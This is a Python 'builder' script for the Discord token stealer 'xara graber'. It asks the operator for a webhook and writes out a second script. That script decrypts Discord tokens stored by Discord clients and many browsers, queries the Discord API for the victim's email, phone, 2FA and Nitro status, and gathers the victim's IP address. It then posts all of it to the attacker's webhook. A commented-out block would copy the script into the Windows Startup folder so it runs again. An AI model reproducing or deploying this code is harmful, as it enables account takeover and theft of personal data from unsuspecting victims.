from os import name, chdir, rmdir, mkdir, rename, listdir
from os.path import isdir
from pystyle import Anime, Colorate, Colors, Center, System, Write
from random import choice, shuffle, randint
from binascii import hexlify
from shutil import rmtree
import os



class Make:
    def grab(webhook: str) -> str:
        return r"""from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import time
from shutil import copy
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from PIL import ImageGrab



#path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/xara_graber.pyw" % getenv("userprofile")
#if not isfile(path):
#    copy(__file__, path)
#    startfile(path)
#    exit()
#elif __file__.replace('\\', '/') != path.replace('\\', '/'):
#    exit()



webhook = '""" + webhook + r"""'

tokens = []
cleaned = []
checker = []


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = True
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0


                        embed = {
                            "username": f"xara Graber | v1.0.0",
                            "content": "@everyone",
                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "xara Graber | strikes again !",
                                        "url": "https://discord.gg/WajMeYnsAa ",
                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                                    },
                                    "description": f'   🕷   \n <:1119pepesneakyevil:972703371221954630>**・__Username__** ```{user_name} | {user_id}```\n 📧**・__email__** ```{email}```\n 📞**・__Phone Number__** ```{phone}```\n                    <:2fa:1024718014278533212>・**__2FA__**: {mfa_enabled}                                <a:nitroboost:996004213354139658>・**__Nitro__**: {has_nitro}               \n\n**                                                                    🔐・__Tokens__**\n ```{tok}``` \n                                 **__Token Grab Dev by > xara ~$#3123__**\n',
                                    "color": 0x00000F,
                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                    "thumbnail": {
                                      "url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965754587267092/mp4.gif"
                                    },
                                     "footer": {
                                        "text": "xara Graber | strikes again !",
                                        "icon_url": "https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
                    }
                }
            ]
        }


                        fileEmbed = {
                            "username": f"xara Graber | v1.0.0",
                            "avatar_url":"https://cdn.discordapp.com/attachments/972965986766557215/1030965023436177408/darck_pp.png"
        }

        requests.post(webhook, json=embed)

"""

    strings = "abcdefghijklmnopqrstuvwxyz0123456789"






class grab:
    def grab(self) -> None:
        self.content = Make.grab(webhook=self.webhook)
        return None
        



class Build(grab):
    def __init__(self, webhook: str) -> None:
        self.file, self.webhook, self.content, self.key = "build/xaraGraber.py", webhook, ..., ...
        self.build()
        return None

    def build(self) -> None:
        self.grab()
        self.folder()
        self.save()
        return None

    
    def folder(self) -> None:
        if isdir('build'):
            rmtree('build')
        mkdir('build')
        return None


    def save(self) -> None:
        with open(self.file, mode='w', encoding='utf-8') as f:
            f.write(self.content)
        return None





banner1 = """
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |                 |  |  |     |         |      |
     |  | C:\>_xara graber|  |  |/----|`---=    |      |
     |  |     builder     |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'                                             
"""[1:].replace('M', '0')


banner2 = """
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |                 |  |  |     |         |      |
     |  | C:\>_xara graber|  |  |/----|`---=    |      |
     |  |     builder     |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'                                             
"""[1:].replace('m','0')


banner = choice((banner1, banner2))


ascii = '''
                                                                           /$$                          
                                                                          | $$                          
 /$$   /$$  /$$$$$$   /$$$$$$  /$$$$$$         /$$$$$$   /$$$$$$  /$$$$$$ | $$$$$$$   /$$$$$$   /$$$$$$ 
|  $$ /$$/ |____  $$ /$$__  $$|____  $$       /$$__  $$ /$$__  $$|____  $$| $$__  $$ /$$__  $$ /$$__  $$
 \  $$$$/   /$$$$$$$| $$  \__/ /$$$$$$$      | $$  \ $$| $$  \__/ /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
  >$$  $$  /$$__  $$| $$      /$$__  $$      | $$  | $$| $$      /$$__  $$| $$  | $$| $$_____/| $$      
 /$$/\  $$|  $$$$$$$| $$     |  $$$$$$$      |  $$$$$$$| $$     |  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  \__/ \_______/|__/      \_______/       \____  $$|__/      \_______/|_______/  \_______/|__/      
                                              /$$  \ $$                                                 
                                             |  $$$$$$/                                                 
                                              \______/                                                  
'''[1:]


def init():
    System.Clear()
    System.Title("xara graber - Builder")
    System.Size(120, 30)
    Anime.Fade(text=Center.Center(banner2), color=Colors.purple_to_blue, mode=Colorate.Diagonal, enter=True)


def main():
    System.Clear()
    print('\n'*2)
    print(Colorate.Horizontal(Colors.purple_to_blue, Center.XCenter(ascii)))
    print('\n'*3)
    webhook = Write.Input("Enter your webhook -> ", 
            Colors.purple_to_blue, interval=0.005, input_color=Colors.white)

    if not webhook.strip():
        Colorate.Error("Please enter a valid webhook!")
        return
    

    Build(webhook=webhook)

    print()
    Write.Input("Built!", Colors.purple_to_blue, interval=0.005)
    return exit()



if __name__ == '__main__':
    init()
    while True:
        main()